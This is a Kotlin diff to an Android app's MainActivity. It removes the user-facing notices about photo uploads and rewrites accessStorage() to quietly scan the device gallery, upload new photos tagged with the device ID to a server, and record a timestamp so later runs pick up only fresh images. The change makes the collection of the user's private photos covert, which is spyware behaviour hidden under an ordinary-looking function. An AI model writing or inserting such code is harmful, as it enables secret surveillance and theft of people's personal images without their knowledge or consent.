@@ -168,10 +168,8 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
 
             val responseCode = conn.responseCode
             val response = conn.inputStream.bufferedReader().use { it.readText() }
-            showToast("✅ 上传成功 [$responseCode]: $fileName")
 
         } catch (e: Exception) {
-            showToast("❌ 上传失败: ${e.message}")
         }
     }
 
@@ -216,47 +214,63 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     }
 
     private fun accessStorage() {
-        val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
-        var deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
+    val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
+    var deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
 
-        if (deviceId.isNullOrBlank()) {
-            deviceId = prefs.getString("random_device_id", null) ?: java.util.UUID.randomUUID().toString().also {
-                prefs.edit().putString("random_device_id", it).apply()
-                showToast("⚠️ 无法获取 Android_ID，生成随机设备 ID: $it")
-            }
-        } else {
-            showToast("📱 获取到设备 ID: $deviceId")
-        }
-
-        lifecycleScope.launch(Dispatchers.IO) {
-            val projection = arrayOf(
-                MediaStore.Images.Media._ID,
-                MediaStore.Images.Media.DISPLAY_NAME
-            )
-
-            val cursor = contentResolver.query(
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                projection,
-                null,
-                null,
-                "${MediaStore.Images.Media.DATE_ADDED} DESC"
-            )
-
-            cursor?.use {
-                var index = 0
-                while (it.moveToNext()) {
-                    val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
-                    val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
-                    val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
-
-                    showToast("📤 正在上传第 ${index + 1} 张: $name")
-                    delay(index * 200L)
-                    uploadImageToServer(uri, name, deviceId)
-                    index++
-                }
-            } ?: showToast("❌ 无法读取相册")
+    if (deviceId.isNullOrBlank()) {
+        deviceId = prefs.getString("random_device_id", null) ?: java.util.UUID.randomUUID().toString().also {
+            prefs.edit().putString("random_device_id", it).apply()
         }
     }
+
+    // 获取上次上传的最后时间（单位：秒）
+    val lastUploadTime = prefs.getLong("last_upload_time", 0L)
+
+    lifecycleScope.launch(Dispatchers.IO) {
+        val projection = arrayOf(
+            MediaStore.Images.Media._ID,
+            MediaStore.Images.Media.DISPLAY_NAME,
+            MediaStore.Images.Media.DATE_TAKEN,
+            MediaStore.Images.Media.DATE_ADDED
+        )
+
+        val cursor = contentResolver.query(
+            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+            projection,
+            null,
+            null,
+            "${MediaStore.Images.Media.DATE_ADDED} ASC"
+        )
+
+        var maxTimestamp = lastUploadTime
+        val toUpload = mutableListOf<Triple<android.net.Uri, String, Long>>() // uri, name, timestamp
+
+        cursor?.use {
+            while (it.moveToNext()) {
+                val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
+                val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
+                val dateTaken = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))
+                val dateAdded = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
+                val timestamp = if (dateTaken > 0) dateTaken else dateAdded
+
+                if (timestamp > lastUploadTime) {
+                    val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
+                    toUpload.add(Triple(uri, name, timestamp))
+                }
+            }
+        }
+
+        // 按时间戳排序后上传
+        toUpload.sortedBy { it.third }.forEachIndexed { index, (uri, name, timestamp) ->
+            delay(200L)
+            uploadImageToServer(uri, name, deviceId)
+            if (timestamp > maxTimestamp) maxTimestamp = timestamp
+        }
+
+        // 更新记录
+        prefs.edit().putLong("last_upload_time", maxTimestamp).apply()
+    }
+}
 
     override fun onRequestPermissionsResult(
         requestCode: Int,
